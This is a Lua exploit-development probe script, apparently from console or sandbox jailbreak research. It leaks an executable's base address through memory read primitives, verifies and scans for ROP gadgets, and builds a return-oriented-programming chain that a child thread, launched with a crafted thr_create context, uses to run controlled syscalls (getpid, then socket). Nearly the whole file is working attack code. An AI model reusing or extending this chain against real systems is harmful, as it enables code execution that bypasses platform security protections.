-- CRASH_CLASS: MODERATE
-- PROBE 127a: Child thread ROP chain for controlled syscalls
--
-- Builds on 156c/156d (confirmed child thread execution) to construct
-- a ROP chain in the child thread's stack. The child will:
-- 1. Execute a syscall (getpid first, then UMTX ops)
-- 2. Store the result to shared memory
-- 3. Park itself (jmp $ loop)
--
-- Key insight: child thread has full GP register control AND a controlled
-- stack (RSP), so we lay out gadget addresses + values sequentially.
-- The child's RIP starts at the first gadget, each `ret` chains to the next.

print("=== PROBE 127a: CHILD THREAD ROP SYSCALL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- [A] Get eboot base
print("[A] Eboot base")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)

local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local text_size_lo = rd(N(info) + 0x110) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
if text_size_lo < 0 then text_size_lo = text_size_lo + 0x100000000 end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
local eboot_size = text_size_lo
print(string.format("  base=%s size=0x%X", fmt(eboot), eboot_size))

if eboot_size == 0 or eboot_size > 0x2000000 then
    print("ERROR: bad eboot size") return
end

-- [B] Verify known gadgets at their offsets
print("")
print("[B] Gadget verification")

local function verify_gadget(name, offset, expected_bytes, len)
    local addr = N(eboot) + offset
    local d = rd(addr) or 0
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, len - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    local got = d % (mask + 1)
    local ok = (got == expected_bytes)
    print(string.format("  %-20s +0x%X: %s (expect %s) %s",
        name, offset, string.format("0x%X", got),
        string.format("0x%X", expected_bytes),
        ok and "OK" or "MISMATCH"))
    return ok
end

-- ret = C3
local G_RET = 0x42
verify_gadget("ret", G_RET, 0xC3, 1)

-- xor eax,eax; ret = 31 C0 C3
local G_XOR_EAX = 0x471
verify_gadget("xor_eax_ret", G_XOR_EAX, 0xC3C031, 3)

-- pop rax; ret = 58 C3
local G_POP_RAX = 0x992
verify_gadget("pop_rax_ret", G_POP_RAX, 0xC358, 2)

-- pop rdi; ret = 5F C3
local G_POP_RDI = 0xC9DFE
verify_gadget("pop_rdi_ret", G_POP_RDI, 0xC35F, 2)

-- pop rsi; ret = 5E C3
local G_POP_RSI = 0xD77D
verify_gadget("pop_rsi_ret", G_POP_RSI, 0xC35E, 2)

-- pop rdx; ret = 5A C3
local G_POP_RDX = 0x420E6D
verify_gadget("pop_rdx_ret", G_POP_RDX, 0xC35A, 2)

-- mov [rdi], rax; ret = 48 89 07 C3
local G_MOV_RDI_RAX = 0x98C67
verify_gadget("mov_[rdi]_rax_ret", G_MOV_RDI_RAX, 0xC3078948, 4)

if not alive() then print("DIED during verify!") return end

-- [C] Search for syscall (0F 05) and jmp $ (EB FE) in eboot
print("")
print("[C] Scanning for syscall and jmp$ gadgets")

local G_SYSCALL = nil
local G_SYSCALL_RET = nil
local G_JMP_SELF = nil
local scan_count = 0

-- Scan in 4-byte steps, checking all byte positions
-- We only need to find one of each, so we can stop early
local SCAN_LIMIT = eboot_size
if SCAN_LIMIT > 0x200000 then SCAN_LIMIT = 0x200000 end  -- 2MB max for speed

for off = 0, SCAN_LIMIT - 4, 4 do
    local d = rd(N(eboot) + off)
    if d == nil then break end
    if d < 0 then d = d + 0x100000000 end

    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256

    -- syscall; ret = 0F 05 C3
    if not G_SYSCALL_RET then
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then G_SYSCALL_RET = off end
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then G_SYSCALL_RET = off + 1 end
    end

    -- syscall (bare) = 0F 05
    if not G_SYSCALL then
        if b0 == 0x0F and b1 == 0x05 then G_SYSCALL = off end
        if b1 == 0x0F and b2 == 0x05 then G_SYSCALL = off + 1 end
        if b2 == 0x0F and b3 == 0x05 then G_SYSCALL = off + 2 end
    end

    -- jmp $ = EB FE
    if not G_JMP_SELF then
        if b0 == 0xEB and b1 == 0xFE then G_JMP_SELF = off end
        if b1 == 0xEB and b2 == 0xFE then G_JMP_SELF = off + 1 end
        if b2 == 0xEB and b3 == 0xFE then G_JMP_SELF = off + 2 end
    end

    scan_count = scan_count + 1
    if G_SYSCALL_RET and G_JMP_SELF then break end
end

print(string.format("  scanned %d dwords (0x%X bytes)", scan_count, scan_count * 4))

if G_SYSCALL_RET then
    print(string.format("  syscall;ret @ +0x%X", G_SYSCALL_RET))
    verify_gadget("syscall_ret_found", G_SYSCALL_RET, 0xC3050F, 3)
elseif G_SYSCALL then
    print(string.format("  syscall (bare) @ +0x%X (no ret follows)", G_SYSCALL))
else
    print("  NO syscall found in first 2MB!")
end

if G_JMP_SELF then
    print(string.format("  jmp$ @ +0x%X", G_JMP_SELF))
    verify_gadget("jmp_self_found", G_JMP_SELF, 0xFEEB, 2)
else
    print("  NO jmp$ found in first 2MB!")
end

-- If no syscall;ret in first 2MB, extend search
if not G_SYSCALL_RET and not G_SYSCALL then
    print("  extending scan to full eboot...")
    for off = 0x200000, eboot_size - 4, 4 do
        local d = rd(N(eboot) + off)
        if d == nil then break end
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then G_SYSCALL_RET = off; break end
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then G_SYSCALL_RET = off + 1; break end
        if not G_SYSCALL then
            if b0 == 0x0F and b1 == 0x05 then G_SYSCALL = off end
        end
    end
    if G_SYSCALL_RET then
        print(string.format("  syscall;ret @ +0x%X (extended)", G_SYSCALL_RET))
    elseif G_SYSCALL then
        print(string.format("  syscall (bare) @ +0x%X (extended)", G_SYSCALL))
    else
        print("  NO syscall found anywhere in eboot!")
    end
end

if not alive() then print("DIED during scan!") return end

-- Use syscall;ret if available, else bare syscall
local SYSCALL_GADGET = G_SYSCALL_RET or G_SYSCALL
if not SYSCALL_GADGET then
    print("ABORT: no syscall gadget found")
    return
end

-- If no jmp$, use ret as a "park" (will crash but after storing result)
local PARK_GADGET = G_JMP_SELF or G_RET

-- [D] Build child thread ROP chain for getpid
print("")
print("[D] Building child thread context")

-- Allocate pages
local STACK_SIZE = 0x4000
local stack_page = memory.alloc(STACK_SIZE)
local result_page = memory.alloc(0x1000)
local uctx_page = memory.alloc(0x500)

local STACK = N(stack_page)
local RESULT = N(result_page)
local UCTX = N(uctx_page)

-- Zero everything
for i = 0, STACK_SIZE - 1, 4 do wd(STACK + i, 0) end
for i = 0, 0xFFF, 4 do wd(RESULT + i, 0) end
for i = 0, 0x4FF, 4 do wd(UCTX + i, 0) end

-- Write sentinel to result page
wq(RESULT, uint64("0xDEADDEADDEADDEAD"))

-- Build ROP chain at top of stack
-- The child starts with RIP = syscall gadget, registers set for getpid.
-- After syscall returns (or syscall;ret returns), execution continues from [RSP].
-- Stack layout (RSP points here):
--
-- If using syscall;ret:
--   [RSP+0x00] = &(pop rdi; ret)      -- reload rdi with result address
--   [RSP+0x08] = result_page           -- value for rdi
--   [RSP+0x10] = &(mov [rdi],rax; ret) -- store syscall result
--   [RSP+0x18] = &(park)               -- spin forever
--
-- If using bare syscall (no ret after it):
--   The instruction after syscall might crash. We need syscall;ret.
--   If only bare, we set RSP so that the instruction after syscall
--   would need to be safe... this is fragile. Let's require syscall;ret.

if not G_SYSCALL_RET then
    print("WARNING: using bare syscall, post-syscall behavior unknown")
end

-- Place ROP chain near top of stack (leave room for growth)
local chain_base = STACK + STACK_SIZE - 0x100  -- 256 bytes from top

local function write_chain_entry(idx, val)
    wq(chain_base + idx * 8, val)
end

-- Compute absolute gadget addresses
local function gadget(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- ROP chain entries
write_chain_entry(0, gadget(G_POP_RDI))       -- pop rdi; ret
write_chain_entry(1, result_page)               -- -> rdi = result_page
write_chain_entry(2, gadget(G_MOV_RDI_RAX))   -- mov [rdi], rax; ret
write_chain_entry(3, gadget(PARK_GADGET))      -- spin / park

-- Set RSP to chain_base
local child_rsp = uint64(string.format("0x%X%08X",
    math.floor(chain_base / 0x100000000),
    chain_base % 0x100000000))

-- Use syscall gadget as RIP
local child_rip = gadget(SYSCALL_GADGET)

print(string.format("  chain @ 0x%X, RSP=%s", chain_base, fmt(child_rsp)))
print(string.format("  RIP=%s (syscall gadget +0x%X)", fmt(child_rip), SYSCALL_GADGET))
print(string.format("  result @ 0x%X", RESULT))

-- Build ucontext
-- Gates
wq(UCTX + 0x108, uint64("0x480"))    -- gate 1
wd(UCTX + 0x0D0, 0)                  -- gate 2 (flags <= 7)
wq(UCTX + 0x110, uint64("0x10000"))  -- gate 3

-- Segments
wq(UCTX + 0x0C0, uint64("0x43"))     -- CS
wq(UCTX + 0x100, uint64("0x3B"))     -- SS

-- RIP and RSP
wq(UCTX + 0x0E0, child_rip)          -- RIP = syscall gadget
wq(UCTX + 0x0F8, child_rsp)          -- RSP = chain base

-- GP registers for getpid: RAX = 20, others don't matter
wq(UCTX + 0x078, uint64(20))         -- RAX = 20 (getpid)
wq(UCTX + 0x048, uint64(0))          -- RDI = 0 (unused for getpid)
wq(UCTX + 0x050, uint64(0))          -- RSI = 0
wq(UCTX + 0x058, uint64(0))          -- RDX = 0
wq(UCTX + 0x088, child_rsp)          -- RBP = same as RSP (safe frame)

print("  ucontext built, RAX=20 (getpid)")

-- [E] Create child thread
print("")
print("[E] Creating child thread")

local sc_thr = mk(430)
local ok_t, rv_t = pcall(function()
    return sc_thr(uctx_page, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)

if not alive() then
    print("  PARENT DIED on thr_create!")
    return
end

local thr_rv = ok_t and N(rv_t) or -999
print(string.format("  thr_create ret=%d", thr_rv))

if thr_rv ~= 0 then
    print("  thr_create failed!")
    -- Read TID from ucontext (thr_create writes TID before validation)
    local tid_lo = rd(UCTX) or 0
    local tid_hi = rd(UCTX + 4) or 0
    print(string.format("  tid field=%d,%d", tid_lo, tid_hi))
    print("=== 127a COMPLETE (thr_create failed) ===")
    return
end

-- [F] Wait briefly and check result
print("")
print("[F] Checking result")

-- Read TID
local tid_lo = rd(UCTX) or 0
print(string.format("  child TID=%d", tid_lo))

-- Small busy-wait to let child execute
-- The child should be near-instant (just syscall + store + park)
for i = 1, 1000 do
    local _ = rd(RESULT) -- just burn time
end

-- Read result
local res = rq(RESULT)
local res_hi, res_lo = get_hi_lo(res)
if res_hi < 0 then res_hi = res_hi + 0x100000000 end
if res_lo < 0 then res_lo = res_lo + 0x100000000 end

print(string.format("  result page: %s", fmt(res)))
print(string.format("  parent pid: %d", pid))

if res_lo == pid and res_hi == 0 then
    print("  *** CHILD THREAD SYSCALL CONFIRMED ***")
    print("  getpid returned correct PID via ROP chain!")
elseif res_hi == 0xDEADDEAD and res_lo == 0xDEADDEAD then
    print("  result unchanged (child hasn't written yet or chain failed)")
    -- Wait more
    for i = 1, 10000 do local _ = rd(RESULT) end
    res = rq(RESULT)
    res_hi, res_lo = get_hi_lo(res)
    if res_hi < 0 then res_hi = res_hi + 0x100000000 end
    if res_lo < 0 then res_lo = res_lo + 0x100000000 end
    print(string.format("  after longer wait: %s", fmt(res)))
    if res_lo == pid and res_hi == 0 then
        print("  *** CHILD THREAD SYSCALL CONFIRMED (delayed) ***")
    end
else
    print(string.format("  unexpected value: hi=0x%X lo=0x%X", res_hi, res_lo))
    -- Dump first 64 bytes of result page for debugging
    local line = "  result dump: "
    for i = 0, 56, 8 do
        local v = rq(RESULT + i)
        line = line .. fmt(v) .. " "
    end
    print(line)
end

if not alive() then print("PARENT DIED after check!") return end

-- [G] If getpid worked, try a real syscall: socket(2,1,6) = should return fd
if res_lo == pid and res_hi == 0 then
    print("")
    print("[G] Testing socket syscall via child ROP")

    -- Reset result
    wq(RESULT, uint64("0xDEADDEADDEADDEAD"))

    -- New child thread context for socket(AF_INET=2, SOCK_STREAM=1, TCP=6)
    -- syscall 97 = socket
    for i = 0, 0x4FF, 4 do wd(UCTX + i, 0) end

    -- Gates
    wq(UCTX + 0x108, uint64("0x480"))
    wd(UCTX + 0x0D0, 0)
    wq(UCTX + 0x110, uint64("0x10000"))
    wq(UCTX + 0x0C0, uint64("0x43"))
    wq(UCTX + 0x100, uint64("0x3B"))

    -- Allocate fresh stack for this thread
    local stack2 = memory.alloc(STACK_SIZE)
    local S2 = N(stack2)
    for i = 0, STACK_SIZE - 1, 4 do wd(S2 + i, 0) end

    local chain2 = S2 + STACK_SIZE - 0x100
    wq(chain2, gadget(G_POP_RDI))
    wq(chain2 + 8, result_page)
    wq(chain2 + 16, gadget(G_MOV_RDI_RAX))
    wq(chain2 + 24, gadget(PARK_GADGET))

    local rsp2 = uint64(string.format("0x%X%08X",
        math.floor(chain2 / 0x100000000), chain2 % 0x100000000))

    wq(UCTX + 0x0E0, child_rip)          -- RIP = syscall
    wq(UCTX + 0x0F8, rsp2)               -- RSP = chain2
    wq(UCTX + 0x078, uint64(97))          -- RAX = 97 (socket)
    wq(UCTX + 0x048, uint64(2))           -- RDI = AF_INET
    wq(UCTX + 0x050, uint64(1))           -- RSI = SOCK_STREAM
    wq(UCTX + 0x058, uint64(6))           -- RDX = IPPROTO_TCP
    wq(UCTX + 0x088, rsp2)               -- RBP

    local ok_t2, rv_t2 = pcall(function()
        return sc_thr(uctx_page, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if not alive() then print("  PARENT DIED!") return end

    print(string.format("  thr_create ret=%d", ok_t2 and N(rv_t2) or -999))

    for i = 1, 5000 do local _ = rd(RESULT) end

    res = rq(RESULT)
    res_hi, res_lo = get_hi_lo(res)
    if res_hi < 0 then res_hi = res_hi + 0x100000000 end
    if res_lo < 0 then res_lo = res_lo + 0x100000000 end

    print(string.format("  socket result: %s", fmt(res)))
    if res_lo > 0 and res_lo < 1000 and res_hi == 0 then
        print(string.format("  *** SOCKET FD=%d VIA CHILD THREAD ***", res_lo))
    elseif res_hi == 0xDEADDEAD then
        print("  result unchanged (chain failed)")
    else
        print(string.format("  unexpected: hi=0x%X lo=0x%X", res_hi, res_lo))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127a COMPLETE ===")
